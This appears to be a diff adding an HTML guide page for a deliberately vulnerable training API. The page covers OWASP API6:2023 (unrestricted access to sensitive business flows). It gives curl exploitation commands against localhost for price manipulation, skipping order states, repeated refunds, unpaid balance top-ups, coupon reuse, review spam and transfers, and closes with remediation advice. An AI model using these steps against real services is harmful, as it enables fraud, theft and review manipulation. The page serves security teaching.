@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>API6:2023 - Unrestricted Access to Sensitive Business Flows | VulnAPI-101</title>
+    <link rel="stylesheet" href="/static/css/style.css">
+</head>
+<body>
+    <header>
+        <h1>VulnAPI-101 <span class="warning-badge">GUIDES</span></h1>
+        <p>OWASP API Top 10 Vulnerability Reference</p>
+    </header>
+
+    <nav>
+        <ul>
+            <li><a href="/static/index.html">API Testing</a></li>
+            <li><a href="/guides/">Vulnerability Guides</a></li>
+            <li><a href="/guides/by-vulnerability.html">By Vulnerability</a></li>
+            <li><a href="/guides/by-file.html">By File</a></li>
+        </ul>
+    </nav>
+
+    <main>
+        <div class="container">
+            <h2><span class="owasp-tag owasp-api6">API6:2023</span> Unrestricted Access to Sensitive Business Flows</h2>
+            <span class="badge badge-warning">MEDIUM SEVERITY</span>
+
+            <h3>Description</h3>
+            <p>This vulnerability occurs when APIs expose business flows that can be abused when accessed without restrictions. Attackers can automate abuse of legitimate functionality like mass purchasing, review manipulation, or bypassing business rules.</p>
+
+            <h3>Affected Files</h3>
+            <ul>
+                <li><code>app/routes/orders.py</code> - Price manipulation, status skipping</li>
+                <li><code>app/routes/products.py</code> - Review spam, coupon abuse</li>
+                <li><code>app/routes/users.py</code> - Balance manipulation, unlimited transfers</li>
+            </ul>
+        </div>
+
+        <div class="container">
+            <h2>Exploitation Guide</h2>
+
+            <h3>1. Price Manipulation</h3>
+            <p>Client-provided price is trusted instead of calculated server-side:</p>
+            <div class="code-container">
+                <pre><code># Get auth token
+TOKEN=$(curl -s -X POST http://localhost:5000/api/auth/login \
+  -H "Content-Type: application/json" \
+  -d '{"username": "john", "password": "password123"}' | jq -r '.token')
+
+# Product normally costs $199.99
+# Create order with manipulated price
+curl -X POST http://localhost:5000/api/orders \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "product_id": 3,
+    "quantity": 100,
+    "total_price": 0.01
+  }'
+
+# Buy $19,999 worth of products for $0.01!</code></pre>
+            </div>
+
+            <h3>2. Order Status Skipping</h3>
+            <p>Business flow states can be skipped without validation:</p>
+            <div class="code-container">
+                <pre><code># Create pending order
+ORDER=$(curl -s -X POST http://localhost:5000/api/orders \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"product_id": 1, "quantity": 1}' | jq -r '.order.id')
+
+# Skip payment, shipping - go directly to delivered!
+curl -X PATCH http://localhost:5000/api/orders/$ORDER/status \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"status": "delivered"}'
+
+# Normal flow: pending -> confirmed -> paid -> shipped -> delivered
+# Attacker: pending -> delivered (skipping payment!)</code></pre>
+            </div>
+
+            <h3>3. Multiple Refunds (Double Spending)</h3>
+            <p>No check if order was already refunded:</p>
+            <div class="code-container">
+                <pre><code># Request refund - gets full amount back
+curl -X POST http://localhost:5000/api/orders/1/refund \
+  -H "Authorization: Bearer $TOKEN"
+
+# Request refund again - no check for existing refund!
+curl -X POST http://localhost:5000/api/orders/1/refund \
+  -H "Authorization: Bearer $TOKEN"
+
+# Request 10 refunds for same order
+for i in {1..10}; do
+  curl -X POST http://localhost:5000/api/orders/1/refund \
+    -H "Authorization: Bearer $TOKEN"
+  echo "Refund $i completed"
+done
+
+# Account balance inflated 10x!</code></pre>
+            </div>
+
+            <h3>4. Unlimited Balance Addition</h3>
+            <p>Add funds without payment verification:</p>
+            <div class="code-container">
+                <pre><code># Add money to account without payment
+curl -X POST http://localhost:5000/api/users/me/balance \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"action": "add", "amount": 1000000}'
+
+# Check new balance
+curl http://localhost:5000/api/users/me \
+  -H "Authorization: Bearer $TOKEN" | jq '.user.balance'</code></pre>
+            </div>
+
+            <h3>5. Coupon Abuse</h3>
+            <p>Same coupon can be applied multiple times per user:</p>
+            <div class="code-container">
+                <pre><code># Apply 100% discount coupon multiple times
+for i in {1..10}; do
+  curl -X POST http://localhost:5000/api/products/coupons/apply \
+    -H "Authorization: Bearer $TOKEN" \
+    -H "Content-Type: application/json" \
+    -d '{"code": "FREEBIE100", "order_total": 1000}'
+done
+
+# Each application gives another 100% discount
+# No per-user tracking or single-use enforcement</code></pre>
+            </div>
+
+            <h3>6. Review Spam / Rating Manipulation</h3>
+            <p>No purchase verification or rate limiting on reviews:</p>
+            <div class="code-container">
+                <pre><code># Spam negative reviews without purchase
+for i in {1..100}; do
+  curl -X POST http://localhost:5000/api/products/1/comments \
+    -H "Authorization: Bearer $TOKEN" \
+    -H "Content-Type: application/json" \
+    -d "{\"content\": \"Terrible product! Review $i\", \"rating\": 1}"
+done
+
+# Or spam 5-star reviews for competitor manipulation
+for i in {1..100}; do
+  curl -X POST http://localhost:5000/api/products/2/comments \
+    -H "Authorization: Bearer $TOKEN" \
+    -H "Content-Type: application/json" \
+    -d "{\"content\": \"Best product ever! Review $i\", \"rating\": 5}"
+done</code></pre>
+            </div>
+
+            <h3>7. Money Transfer Abuse</h3>
+            <p>Transfer money without proper verification:</p>
+            <div class="code-container">
+                <pre><code># Transfer money to own account from hacked account
+# (Combined with BOLA vulnerability)
+curl -X POST http://localhost:5000/api/users/me/balance \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "action": "transfer",
+    "amount": 10000,
+    "target_user_id": 2
+  }'
+
+# No 2FA, no confirmation, no transfer limits</code></pre>
+            </div>
+        </div>
+
+        <div class="container">
+            <h2>Impact</h2>
+            <ul>
+                <li><strong>Financial Loss:</strong> Products purchased for free or pennies</li>
+                <li><strong>Inventory Exhaustion:</strong> Bot-driven mass purchasing</li>
+                <li><strong>Review Manipulation:</strong> Fake reviews damage reputation</li>
+                <li><strong>Money Laundering:</strong> Unlimited transfers, multiple refunds</li>
+                <li><strong>Competitive Damage:</strong> Exhaust competitors' inventory or destroy ratings</li>
+            </ul>
+        </div>
+
+        <div class="container">
+            <h2>Remediation</h2>
+            <ol>
+                <li>Server-side price calculation (never trust client)</li>
+                <li>Implement state machine for order status transitions</li>
+                <li>Track refunds per order, allow only once</li>
+                <li>Require purchase verification before reviews</li>
+                <li>Implement CAPTCHA or rate limiting for sensitive flows</li>
+                <li>Add 2FA for financial transactions</li>
+                <li>Track coupon usage per user</li>
+            </ol>
+        </div>
+    </main>
+
+    <footer>
+        <p>VulnAPI-101 - Educational Purposes Only | <a href="https://owasp.org/API-Security/editions/2023/en/0xa6-unrestricted-access-to-sensitive-business-flows/">OWASP Reference</a></p>
+    </footer>
+</body>
+</html>
